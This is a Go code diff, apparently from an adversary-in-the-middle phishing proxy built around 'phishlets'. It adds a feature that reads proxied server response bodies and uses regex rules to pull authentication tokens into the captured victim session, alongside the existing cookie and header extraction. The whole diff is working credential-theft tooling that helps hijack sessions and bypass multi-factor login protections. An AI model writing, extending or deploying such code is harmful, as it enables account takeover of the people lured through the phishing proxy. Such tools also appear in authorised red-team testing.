@@ -40,6 +40,25 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 		return nil
 	}
 	cookies := resp.Cookies()
+
+	// Lazily read the response body only if any rule needs body extraction
+	// and the response content type is text-based (skip images, binaries, etc.).
+	var bodyBytes []byte
+	if isMutableMIME(resp.Header.Get("Content-Type")) {
+		for _, rule := range ctx.Phishlet.AuthTokens {
+			if rule.Type == aitm.TokenTypeBody {
+				var err error
+				bodyBytes, err = readBody(resp)
+				if err != nil {
+					h.Logger.Warn("failed to read response body for token extraction", "error", err)
+					break
+				}
+				replaceBody(resp, bodyBytes)
+				break
+			}
+		}
+	}
+
 	updated := false
 	for _, rule := range ctx.Phishlet.AuthTokens {
 		switch rule.Type {
@@ -47,6 +66,8 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 			updated = h.extractCookieToken(ctx, cookies, rule) || updated
 		case aitm.TokenTypeHTTPHeader:
 			updated = h.extractHeaderToken(ctx, resp, rule) || updated
+		case aitm.TokenTypeBody:
+			updated = h.extractBodyToken(ctx, bodyBytes, rule) || updated
 		}
 	}
 	if !ctx.Session.IsDone() && h.Sessions.IsComplete(ctx.Session, ctx.Phishlet) {
@@ -119,6 +140,21 @@ func (h *TokenExtractor) extractHeaderToken(ctx *aitm.ProxyContext, resp *http.R
 		}
 	}
 	return false
+}
+
+func (h *TokenExtractor) extractBodyToken(ctx *aitm.ProxyContext, body []byte, rule aitm.TokenRule) bool {
+	if rule.Search == nil || len(body) == 0 {
+		return false
+	}
+	matches := rule.Search.FindSubmatch(body)
+	if len(matches) < 2 {
+		return false
+	}
+	if ctx.Session.BodyTokens == nil {
+		ctx.Session.BodyTokens = make(map[string]string)
+	}
+	ctx.Session.BodyTokens[rule.Name.String()] = string(matches[1])
+	return true
 }
 
 var _ proxy.ResponseHandler = (*TokenExtractor)(nil)
